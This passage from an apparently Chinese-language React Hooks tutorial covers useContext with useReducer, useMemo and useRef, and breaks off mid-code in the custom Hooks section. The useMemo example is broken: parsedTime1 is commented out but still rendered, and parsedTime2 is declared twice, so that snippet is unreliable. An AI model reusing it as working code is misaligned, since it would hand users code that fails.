class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ShowArea</span> <span class="keyword">from</span> <span class="string">&quot;./components/ShowArea&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Buttons</span> <span class="keyword">from</span> <span class="string">&quot;./components/Buttons&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Page_6</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ShowArea</span>&gt;</span><span class="tag">&lt;/<span class="name">ShowArea</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Buttons</span>&gt;</span><span class="tag">&lt;/<span class="name">Buttons</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Page</span>_6;</span><br></pre></td></tr></table></figure><p>这样就完成了页面的基本布局，那么接下来我们需要另外编写一个 <code>color.js</code> 文件：</p><p>其内部使用了 <code>createContext()</code> 方法创建了一个上下文对象，并向外暴露这个上下文对象 <code>ColorContext</code>；</p><p>同时又向外暴露了一个 <code>Color</code> 组件，该组件为一个上下文组件，并且在组件内部使用 <code>useReducer()</code> 方法创建了 <code>state</code> 对象与 <code>dispath</code> 方法，并完成了 state 的初始化，最后在上下文组件的 <code>value</code> 属性中传入 <code>state</code> 与 <code>dispath</code>；</p><p>同时创建一个 <code>UPDATE_COLOR</code> 变量作为每次派发 action 的类型变量；</p><p>经过上述编写过程，使用 <code>&lt;Color/&gt;</code> 组件包裹的子组件就可以通过使用 <code>useContext</code> 方法就可以来获取到 <code>state</code> 与 <code>dispatch</code> 方法，进而在组件之间共享状态，详细代码如下：</p><p>整体目录结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">components</span><br><span class="line">|- Button,jsx</span><br><span class="line">|- ShowArea.jsx</span><br><span class="line">Page.jsx</span><br><span class="line">color.js</span><br></pre></td></tr></table></figure><p>color.js 的编写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// color.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; createContext, useReducer &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">ColorContext</span> = <span class="title function_">createContext</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">UPDATE_COLOR</span> = <span class="string">&quot;UPDATE_COLOR&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">reducer</span> = (<span class="params">state, action</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> newState = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(state));</span><br><span class="line">  <span class="keyword">switch</span> (action.<span class="property">type</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="attr">UPDATE_COLOR</span>:</span><br><span class="line">      newState.<span class="property">color</span> = action.<span class="property">payload</span>;</span><br><span class="line">      <span class="keyword">return</span> newState;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">Color</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [state, dispatch] = <span class="title function_">useReducer</span>(reducer, &#123; <span class="attr">color</span>: <span class="string">&quot;blue&quot;</span> &#125;);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">ColorContext.Provider</span> <span class="attr">value</span>=<span class="string">&#123;&#123;</span> <span class="attr">state</span>, <span class="attr">dispatch</span> &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* props.children 为当前组件内包含的子组件，相当于插槽 */&#125;</span></span><br><span class="line"><span class="language-xml">      &#123;props.children&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ColorContext.Provider</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Button 组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Button.jsx</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useContext &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ColorContext</span>, <span class="variable constant_">UPDATE_COLOR</span> &#125; <span class="keyword">from</span> <span class="string">&quot;../color&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Buttons</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; dispatch &#125; = <span class="title function_">useContext</span>(<span class="title class_">ColorContext</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">          dispatch(&#123; type: UPDATE_COLOR, payload: &quot;red&quot; &#125;);</span></span><br><span class="line"><span class="language-xml">        &#125;&#125;</span></span><br><span class="line"><span class="language-xml">      &gt;</span></span><br><span class="line"><span class="language-xml">        红色</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">          dispatch(&#123; type: UPDATE_COLOR, payload: &quot;yellow&quot; &#125;);</span></span><br><span class="line"><span class="language-xml">        &#125;&#125;</span></span><br><span class="line"><span class="language-xml">      &gt;</span></span><br><span class="line"><span class="language-xml">        黄色</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Buttons</span>;</span><br></pre></td></tr></table></figure><p>ShowArea 组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ShowArea.jsx</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useContext &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ColorContext</span> &#125; <span class="keyword">from</span> <span class="string">&quot;../color&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ShowArea</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; state &#125; = <span class="title function_">useContext</span>(<span class="title class_">ColorContext</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">color:</span> <span class="attr">state.color</span> &#125;&#125;&gt;</span>字体的颜色为 &#123;state.color&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">ShowArea</span>;</span><br></pre></td></tr></table></figure><p>最外部的页面组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// page.jsx</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ShowArea</span> <span class="keyword">from</span> <span class="string">&quot;./components/ShowArea&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Buttons</span> <span class="keyword">from</span> <span class="string">&quot;./components/Buttons&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Color</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./color.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Page_6</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Color</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">ShowArea</span>&gt;</span><span class="tag">&lt;/<span class="name">ShowArea</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Buttons</span>&gt;</span><span class="tag">&lt;/<span class="name">Buttons</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Color</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Page</span>_6;</span><br></pre></td></tr></table></figure><h1 id="7-useMemo-优化组件性能"><a href="#7-useMemo-优化组件性能" class="headerlink" title="7. useMemo 优化组件性能"></a>7. useMemo 优化组件性能</h1><p>在 React 中，父组件更新后会导致子组件的重新渲染，因此也会触发子组件重新执行某些函数。在普通的 React 组件中，我们会使用 <code>shouldComponentUpdate()</code> 生命周期函数，来限制子组件重新渲染过程中所执行的方法，从而优化组件性能。而在 React Hooks 中，我们需要用到 <code>useMemo()</code> 来达到此需求：</p><p><a href="https://zh-hans.reactjs.org/docs/hooks-reference.html#usememo">useMemo 官方文档</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> memoizedValue = <span class="title function_">useMemo</span>(<span class="function">() =&gt;</span> <span class="title function_">computeExpensiveValue</span>(a, b), [a, b]);</span><br></pre></td></tr></table></figure><p><code>useMemo()</code> 方法提供了两个参数，第一个参数为方法执行函数，第二个参数为一个 Array，代表侦测值，如果侦测值发生变化，才会执行方法执行函数，如果侦测值没有发生变化，则不会执行。最终 <code>useMemo()</code> 的返回值为第一个参数传入的方法执行函数的返回值。</p><p>我们在此举一个例子：</p><p>在父组件中存在两个按钮，子组件会显示两个时间戳，当父组件点击了某一按钮后，子组件中与之对应的时间戳就会发生改变，如下：</p><p><img src="http://img.cdn.esunr.xyz/markdown/%E9%80%89%E6%8B%A9.gif" alt=""></p><p>父组件如下：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">UseMemo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 设置 tiem1 与 time2</span></span><br><span class="line">  <span class="keyword">const</span> [time1, setTime1] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> [time2, setTime2] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* 按钮组件，点击后会分别修改 time1 和 time2 的值 */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">          setTime1(new Date().getTime());</span></span><br><span class="line"><span class="language-xml">        &#125;&#125;</span></span><br><span class="line"><span class="language-xml">      &gt;</span></span><br><span class="line"><span class="language-xml">        获取 time1</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">          setTime2(new Date().getTime());</span></span><br><span class="line"><span class="language-xml">        &#125;&#125;</span></span><br><span class="line"><span class="language-xml">      &gt;</span></span><br><span class="line"><span class="language-xml">        获取 time2</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* 引入子组件，并向子组件的 props 中传入 time1 与 time2 */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ChildComponent</span> <span class="attr">time1</span>=<span class="string">&#123;time1&#125;</span> <span class="attr">time2</span>=<span class="string">&#123;time2&#125;</span>&gt;</span><span class="tag">&lt;/<span class="name">ChildComponent</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子组件编写:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ChildComponent</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; time1, time2 &#125; = props;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 格式化时间函数</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">parseTime</span>(<span class="params">time = +<span class="keyword">new</span> <span class="built_in">Date</span>()</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>(time + <span class="number">8</span> * <span class="number">3600</span> * <span class="number">1000</span>); <span class="comment">// 增加8小时</span></span><br><span class="line">    <span class="keyword">return</span> date</span><br><span class="line">      .<span class="title function_">toJSON</span>()</span><br><span class="line">      .<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">19</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">&quot;T&quot;</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//IIFE 函数获取结果</span></span><br><span class="line">  <span class="keyword">const</span> parsedTime1 = (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;parsing time1&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">parseTime</span>(time1);</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> parsedTime2 = (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;parsing time2&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">parseTime</span>(time2);</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;parsedTime1&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;parsedTime2&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们预览效果后，会发现，当点击任意一个按钮后，<code>parsedTime1</code> 的值与 <code>parsedTime2</code> 的值都会被重新计算：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200207181856.png" alt="第一组为初始化时的两次计算，第二组为点击任意一按钮后又重新执行的两次计算"></p><p>当我们使用 <code>useMemo()</code> 方法后，就可以避免重复计算：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ChildComponent</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; time1, time2 &#125; = props;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 格式化时间函数</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">parseTime</span>(<span class="params">time = +<span class="keyword">new</span> <span class="built_in">Date</span>()</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>(time + <span class="number">8</span> * <span class="number">3600</span> * <span class="number">1000</span>); <span class="comment">// 增加8小时</span></span><br><span class="line">    <span class="keyword">return</span> date</span><br><span class="line">      .<span class="title function_">toJSON</span>()</span><br><span class="line">      .<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">19</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">&quot;T&quot;</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  //IIFE 函数获取结果</span></span><br><span class="line"><span class="comment">  const parsedTime1 = (() =&gt; &#123;</span></span><br><span class="line"><span class="comment">    console.log(&quot;parsing time1&quot;);</span></span><br><span class="line"><span class="comment">    return parseTime(time1);</span></span><br><span class="line"><span class="comment">  &#125;)();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  const parsedTime1 = useMemo(() =&gt; &#123;</span></span><br><span class="line"><span class="comment">    console.log(&quot;parsing time1&quot;);</span></span><br><span class="line"><span class="comment">    return parseTime(time1);</span></span><br><span class="line"><span class="comment">  &#125;, [time1]);</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> parsedTime2 = <span class="title function_">useMemo</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;parsing time2&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">parseTime</span>(time2);</span><br><span class="line">  &#125;, [time2]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> parsedTime2 = (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;parsing time2&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">parseTime</span>(time2);</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;parsedTime1&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;parsedTime2&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20200207182218.png" alt="分别计算 parsedTime1 与 parsedTime2"></p><h1 id="7-useRef"><a href="#7-useRef" class="headerlink" title="7. useRef"></a>7. useRef</h1><p>当我们需要引用 DOM 节点时就可以使用 <code>useRef()</code> 方法。<code>useRef()</code> 传入一个初始值，其返回一个可变的 ref 对象，其 .current 属性被初始化为传入的参数。</p><p><a href="https://zh-hans.reactjs.org/docs/hooks-reference.html#useref">官方文档</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> refContainer = <span class="title function_">useRef</span>(initialValue);</span><br></pre></td></tr></table></figure><p><code>useRef()</code> 比 <code>ref</code> 属性更有用。它可以<a href="https://zh-hans.reactjs.org/docs/hooks-faq.html#is-there-something-like-instance-variables">很方便地保存任何可变值</a>，其类似于在 class 中使用实例字段的方式。</p><p>这是因为它创建的是一个普通 Javascript 对象。而 <code>useRef()</code> 和自建一个 <code>&#123;current: ...&#125;</code> 对象的唯一区别是，<code>useRef</code> 会在每次渲染时返回同一个 ref 对象。</p><p>具体使用示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useRef &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">UseRefDemo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 创建引用</span></span><br><span class="line">  <span class="keyword">const</span> inputEl = <span class="title function_">useRef</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置点击事件，点击后，input被填入文字</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">handleButtonClick</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    inputEl.<span class="property">current</span>.<span class="property">value</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">ref</span>=<span class="string">&#123;inputEl&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleButtonClick&#125;</span>&gt;</span>在input中展示文字<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">UseRefDemo</span>;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200209194304.png" alt="点击按钮前"></p><p><img src="http://img.cdn.esunr.xyz/markdown/20200209194322.png" alt="点击按钮后"></p><h1 id="8-自定义-Hooks"><a href="#8-自定义-Hooks" class="headerlink" title="8. 自定义 Hooks"></a>8. 自定义 Hooks</h1><blockquote><p>Hook 是 React 16.8 的新增特性。它可以让你在不编写 class 的情况下使用 state 以及其他的 React 特性。</p></blockquote><p>以上就是对 Hook 的官方定义，所谓的自定义 Hook，就是可以将组件逻辑提取到可重用的函数中。</p><p>举个例子，当我们向要获取当前页面的大小，我们可以编写一个 <code>ShowWindowSize</code> 组件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ShowWindowSize</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [size, setSize] = <span class="title function_">useState</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span>,</span><br><span class="line">    <span class="attr">height</span>: <span class="variable language_">document</span>.<span 